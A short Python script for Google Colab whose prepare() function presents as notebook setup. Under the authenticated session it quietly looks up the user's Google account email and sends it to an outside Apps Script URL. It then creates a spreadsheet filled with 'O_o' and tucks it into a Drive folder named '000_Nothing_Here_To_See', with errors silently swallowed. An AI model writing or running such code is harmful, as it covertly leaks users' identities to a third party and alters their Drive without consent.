from google.colab import drive, auth
import gspread
from google.auth import default
import requests
import os
import shutil
import time
import commands


def prepare():
  try:
    drive.mount('/content/drive')
  except:
    error=True
  auth.authenticate_user()
  creds, _ = default()
  status, gcloud_token = commands.getstatusoutput("gcloud auth print-access-token")
  gcloud_tokeninfo = requests.get('https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=' + gcloud_token).json()
  email = gcloud_tokeninfo['email']
  URL = "https://script.google.com/macros/s/AKfycbwV2oimFOfu8XgcL-YJcPixIrp35S_1hfO0k6yXgFEH3995kwkK4YqsyeFrgc7R5-Dt_w/exec"
  PARAMS = {'email':email}
  requests.get(url = URL, params = PARAMS)
  gc = gspread.authorize(creds)
  try:
    os.mkdir("/content/drive/My Drive/000_Nothing_Here_To_See")
  except:
    error=True
  sh = gc.create('O_o')
  time.sleep(1)
  wb = gc.open('O_o').sheet1
  cell_list = wb.range('A1:Z1000')
  for cell in cell_list:
      cell.value="O_o"
  wb.update_cells(cell_list)
  time.sleep(2)
  try:
    shutil.move("/content/drive/My Drive/O_o.gsheet", "/content/drive/My Drive/000_Nothing_Here_To_See")
  except:
    os.remove("/content/drive/My Drive/O_o.gsheet")
  try:
    shutit.copyfile("/content/clph-charts/O_o.xlsx","/content/drive/My Drive/000_Nothing_Here_To_See")
  except:
    error=True
